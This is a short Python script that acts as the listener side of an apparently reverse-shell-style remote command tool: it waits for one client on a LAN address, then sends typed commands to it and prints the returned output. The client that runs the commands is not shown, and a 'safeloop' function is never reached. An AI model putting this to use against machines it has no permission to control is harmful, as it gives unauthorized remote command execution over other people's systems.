import socket
import time

# Set IP and Port
HOST = '192.168.2.126' # Local IP adress of the host pc.
PORT = 1518 # Port that the client connects to

# Connect to Socket
server = socket.socket()
server.bind((HOST, PORT))
print('[+] Server Started')
print('[+] Listening For Client Connection ...')
server.listen(1)
client, client_addr = server.accept()
print(f'[+] {client_addr} Client connected to the server')
output = "null"

# Loop for recieving commands
def loop():
    while True:
        global output
        command = input('Enter Command : ')
        command = command.encode()
        client.send(command)
        print('[+] Command sent')
        
        output = client.recv(1024)
        output = output.decode()
        print(f"Output: {output}")
         
def safeloop():
    time.sleep(20)
    global output
    if output == "null":
        loop() 
       
loop()
safeloop()

